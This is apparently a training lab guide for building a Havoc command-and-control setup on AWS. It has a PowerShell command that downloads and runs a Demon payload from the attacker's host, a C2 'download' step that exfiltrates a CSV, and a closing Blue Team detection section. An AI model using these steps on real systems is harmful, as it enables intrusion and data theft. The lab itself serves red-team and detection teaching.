# Havoc Framework

# Ubuntu VM, Windows VM & AWS Cloud

## The objective of this lab is to establish a modern Command & Control (C2) infrastructure using a cloud-based backend (AWS EC2). You will learn how to bypass network defenses, execute a payload on a compromised Windows machine, exfiltrate data using the Havoc UI, and ultimately hunt for the malicious process as a Blue Teamer.
---

>[!IMPORTANT]
>For this particular lab, you will be required to **have the two VM's in two separate tabs**. We will start on the *Windows VM*. 

---
### Documentation and scenario : 

**What is Havoc?**

Havoc is a modern and malleable post-exploitation command and control framework created by @C5pider. It is widely used by Red Teams to manage compromised machines, execute commands stealthily, and exfiltrate data.

**Core Capabilities of Havoc** :

   - *Malleable C2 Profiles* :  It allows operators to customize how the malware communicates with the server, making the malicious traffic look like normal web browsing (e.g., simulating Microsoft telemetry or regular HTTP requests).
   
   - *Client-Server Architecture* :  It separates the backend (**Teamserver**) from the user interface (**Client**). This allows multiple hackers to connect to the same campaign simultaneously.
   
   - *Advanced Payload Generation* :  Generates custom agents called "Demons" (.exe, .dll, or shellcode) that feature advanced evasion techniques like sleep obfuscation and indirect syscalls.

If you want to dive a bit deeper, check the [Havoc Official GitHub](https://github.com/HavocFramework/Havoc)

>[!NOTE]
> In the cybersecurity landscape, platforms like Havoc and Cobalt Strike are the gold standard for Red Team operations. **Attackers never host the C2 server on their own laptops.** Instead, they rent cheap cloud servers (VPS) to host the Teamserver, making it difficult for Blue Teams to track the attacker's true physical location.


**This exact scenario is what we are going to simulate.** 

### **SCENARIO** : 

 - In this lab, we are simulating a highly realistic Red Team operation. The architecture consists of three parts:
   1. **The Target:** The *Windows VM* represents a compromised machine inside a corporate network.
   2. **The Cloud Infrastructure:** An *AWS EC2 Instance* acts as the Teamserver. This is the "Mothership" that catches the data.
   3. **The Hacker's Terminal:** The *Ubuntu VM* is your local machine running the Havoc Client UI, remotely controlling the mothership.

 - To successfully steal sensitive data, **we will generate a Havoc Demon payload and configure it to communicate via HTTP/HTTPS with our AWS cloud server**.

 - **Why are we doing this?** By putting the backend in the cloud, we protect our true identity (the Ubuntu VM). The victim will only ever see connections going out to a public AWS IP address, which often blends in with legitimate corporate cloud traffic.

>[!IMPORTANT]
> **You** will act as both the Red Teamer and the victim. Pay close attention to which machine (Windows, Ubuntu, or AWS) you are executing commands on. All sensitive data meant to be exfiltrated is located in the **Lab Directory**.

---

### AWS Setup: (!!! NOTE : You will need to do this part on your personal computer)

 - Before we dive in to the actual Lab Exercise, we need an **AWS Free Tier Account**. If you don't have an AWS Account and want a step by step guide for the AWS Free Tier account, check out **Phase 1** of the [ScoutSuite Lab](/Cards/IC/labs/scoutsuite.md). 

>[!NOTE] 
>You will need a *Credit/Debit Card*, Amazon Web Services will withdraw $1 from your account and will hold it for 3-5 days, then return it in order to ensure you are a real person.

Once you have your AWS Account set up, let's get an **EC2 Instance** up and running. 

 - Log into the *AWS Management Console*, type **EC2** in the searchbar and click:
   
<img width="1513" height="688" alt="image" src="https://github.com/user-attachments/assets/921d5f54-1293-40df-9ab0-1756729b6dbc" />

 - Click the orange **Launch Instance** button:

 <img width="1853" height="829" alt="image" src="https://github.com/user-attachments/assets/8fd81a2b-3d52-4ad6-a792-a361b11d848f" />
   
 - Give your instance a recognizable name, like `Havoc-Teamserver`:

 <img width="1203" height="319" alt="image" src="https://github.com/user-attachments/assets/91bd8187-af50-4ff2-a541-014b86c404d0" />
   
 - **Application and OS Images (Amazon Machine Image):** Select **Ubuntu** and make sure the *Ubuntu Server 22.04 LTS* (or newer) is selected. Ensure it has the "Free tier eligible" label.

   <img width="1102" height="662" alt="image" src="https://github.com/user-attachments/assets/70ec7158-fccb-4b1f-be27-1a293a78d69e" />

 - Leave the **instance type** as `t3.micro` (Free tier eligible):

   <img width="1119" height="233" alt="image" src="https://github.com/user-attachments/assets/3c9fdf25-7cab-4f4a-a83b-e8f865b0261d" />
 
 **Key pair (login):** You need this to SSH into your server in the next phase. 
   - Click **Create new key pair**: 
   <img width="1110" height="195" alt="image" src="https://github.com/user-attachments/assets/6ad1a62a-6d48-4ed0-a94d-ea1a144b55e2" />
   
   - Name it *havoc-key*;
     
   - Key pair type: **RSA**, Private key file format: **.pem**;
     
   - Click **Create key pair**. The file will automatically download to your computer. *Keep it safe!*, 

   <img width="632" height="598" alt="image" src="https://github.com/user-attachments/assets/7882a4c9-a74c-4adc-94d1-e18ce7a92f24" />

>[!IMPORTANT]
> Once you recieve **havoc-key.pem**, store it safely on your personal computer.
> Later, you will need to copy the contents and paste them into the **Ubuntu VM**. You need to change the file permissions such that the .pem file can not be read by any users other than root (chmod 400 havoc-key.pem). 
   
 **Network settings:** This is the most important part. We need to open the specific ports Havoc uses. 
   - Next to Network settings, click **Edit**:
     
   <img width="1123" height="629" alt="image" src="https://github.com/user-attachments/assets/4f454119-28f7-430a-8795-1607c3af926a" />

   - Create a new security group and name it *Havoc-SG*:
     
   <img width="1114" height="612" alt="image" src="https://github.com/user-attachments/assets/eabfe645-2e9c-42a4-b180-2f1a3a183889" />

   You need to add the following **Inbound Security Group Rules**:

   - **Rule 1 (SSH):** Leave *Source type: Anywhere*. This ensures that you'll be able to connect to your EC2 from the **Ubuntu VM**: 

   <img width="1064" height="265" alt="image" src="https://github.com/user-attachments/assets/d3a2a2ae-a31b-4607-b26c-cd992c64651e" />

   - **Rule 2 (Havoc Client):** Click "Add security group rule". Type: `Custom TCP`, Port range: `40056`, Source type: `Anywhere-IPv4` (This allows your Ubuntu UI to connect to the backend):

   <img width="1062" height="294" alt="image" src="https://github.com/user-attachments/assets/16b6ea7b-87a3-477b-8154-c2084b285082" />

   - **Rule 3 (Payload Traffic):** Click "Add security group rule". Type: `HTTP`, leave the port range: `80`, Source type: `Anywhere-IPv4`. (This is how the compromised Windows machine will communicate with the Teamserver):

   <img width="1059" height="291" alt="image" src="https://github.com/user-attachments/assets/0fbc667f-65d0-4e05-9556-00cb0baf9210" />

   - **Rule 4 (Secure Payload Traffic):** Click "Add security group rule". Type: `HTTPS`, Port range: `443`, Source type: `Anywhere-IPv4`:
     
   <img width="1059" height="284" alt="image" src="https://github.com/user-attachments/assets/83299f0e-241a-460a-9045-1591ac4fb039" />
 
 **Configure storage:** The default 8 GB is plenty for this lab.
 
 <img width="1117" height="431" alt="image" src="https://github.com/user-attachments/assets/c99353c1-84ca-46d8-ab98-845831c724b6" />
 
 On the right-side summary panel, click **Launch instance**.

---
### Phase 1 : Setup and Objective

We assume initial access to a *Windows 11* System, and our objective is to exfiltrate the sensitive financial databases without getting caught.

- First things first, open Windows PowerShell and navigate to the **Lab Directory** :

```bash 
cd Desktop\Labs\Havoc
```

<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_DIRECTORUL_WINDOWS_AICI]" />

- Let's take a look at the **customer_database.csv** file. This is the "trophy" we are going to use **Havoc** to exfiltrate to our Cloud Teamserver:
  
<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_CONTINUTUL_CSV_AICI]" />

---

### Phase 2: Staging the Cloud Infrastructure (The "Mothership") 

As a professional attacker, you need to spin up your backend infrastructure before deploying malware. 

- *Step 1 (AWS):* Log into your AWS Console, spin up your EC2 Instance, and **ensure your Security Group allows inbound traffic on port 40056 (for the Client) and port 80/443 (for the Victim payload).**
- *Step 2 (AWS Shell):* Connect to your AWS instance via SSH. Download Havoc, compile the Teamserver, and start it using the default profile.

```bash
# Clone the repo and build the teamserver
git clone [https://github.com/HavocFramework/Havoc.git](https://github.com/HavocFramework/Havoc.git)
cd Havoc
make ts-build

# Start the Teamserver
./havoc server --profile ./profiles/havoc.yaotl -v
```

<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_TEAMSERVER_PORNIT_PE_AWS_AICI]" />


>[!IMPORTANT]
> Leave the SSH terminal open so the Teamserver keeps running. **Note down your AWS Public IP address**, you will need it for the next step.  


---

### Phase 3: Connecting the Command Center

Now that the backend is live in the cloud, we will connect our local user interface to it.

- Open up an **Ubuntu Shell** terminal on your local VM.
- Start the pre-installed Havoc Client.

```bash
havoc-client
```

- A login screen will appear. Fill in the connection details:
  - **Host:** `<YOUR_AWS_PUBLIC_IP>`
  - **Port:** `40056`
  - **User:** `5pider` (Default)
  - **Password:** `password1234` (Default)

<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_LOGIN_SCREEN_HAVOC_AICI]" />

Once connected, you are inside the Havoc dashboard!

- **Create a Listener:** Go to *View -> Listeners -> Add*. Set it to HTTP and input your AWS Public IP in the 'Hosts' field. Click Save.
- **Generate the Payload:** Go to *Attack -> Payload*. Select your HTTP Listener, choose 'Windows' and 'Executable (.exe)'. Click Generate and save the file as `demon.exe`.

<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_PAYLOAD_GENERATOR_AICI]" />

- Start a quick Python web server on the Ubuntu VM to host the `demon.exe` so the victim machine can download it:

```bash
python3 -m http.server 8000
```

---

### Phase 4: Payload Delivery & Exfiltration

We now switch to the compromised Windows machine to deliver the payload and execute the attack.

- Download the Havoc Demon directly from our Ubuntu server. **Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.**

```powershell
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8000/demon.exe" -OutFile "$env:TEMP\demon.exe"
```

- Execute the payload:

```powershell
& "$env:TEMP\demon.exe"
```

- **Look back at your Ubuntu VM!** Within seconds, you should see a new active session pop up in the Havoc UI. The Windows machine has successfully "called home" to your AWS Teamserver.

<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_SESIUNEA_ACTIVA_IN_HAVOC_UI_AICI]" />

- **Exfiltration:** Right-click the active session -> *Interact*. You now have a remote shell.
- Use basic commands like `ls` and `cd` to navigate to `C:\Users\Administrator\Desktop\Labs\Havoc`.
- Type the following command to exfiltrate the database:

```bash
download customer_database.csv
```

<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_DOWNLOAD_COMAND_IN_HAVOC_AICI]" />

Once downloaded, you can find the file in your Havoc Loot module (View -> Loot). **Attack successful!**

---

### Phase 5: Blue Team Detection

The attacker used the cloud to hide their identity, but malware must still run on the endpoint. Let's hunt for the active C2 connection.

Open a NEW PowerShell terminal as Administrator on the Windows VM.

- Find the Active Connection. We are looking for unusual processes making outbound TCP connections to external IP addresses.

```PowerShell
Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
```

<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_NETTCPCONNECTION_AICI]" />

*Notice how the RemoteAddress points to our AWS Cloud IP, bypassing internal network suspicion.*

- Identify the Malicious Process. Take the OwningProcess ID (PID) from the connection above and let's see what program is running. (Replace `<PID>` with your specific number).

```PowerShell
Get-Process -Id <PID> | Select-Object Name, Path
```

<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_GET_PROCESS_AICI]" />

Analysis: Finding an unsigned executable named `demon.exe` running from the user's TEMP folder and communicating with an external cloud IP is a massive Indicator of Compromise (IoC).

---

### Cleanup

You're done! Let's clean up the environment to avoid unnecessary AWS charges and remove the malware.

 - **CRITICAL (AWS):** Go to your AWS EC2 Dashboard, right-click your instance, and select **Terminate instance**. If you only close the terminal, Amazon will continue billing you after your free tier limit is reached!
 - On the Windows VM: Use `Stop-Process -Id <PID> -Force` to kill the demon payload.
 - On the Ubuntu VM: Close the Havoc Client and the Python web server.

---

### Conclusion
In this lab, you successfully built a professional-grade C2 infrastructure. You learned how Red Teams separate their UI from their backend using cloud services like AWS to obscure their origin. You successfully delivered a payload, interacted with a compromised machine via the Havoc dashboard, and exfiltrated data. As a Blue Teamer, you discovered that even with cloud-based obfuscation, endpoint forensics (looking at active processes and network connections) will always reveal the execution of malware. 

<br></br>

# Finished?

[Back to Card's Main Page](/Cards/C2E/Cloud_Based_Services_As_Exfil.md)

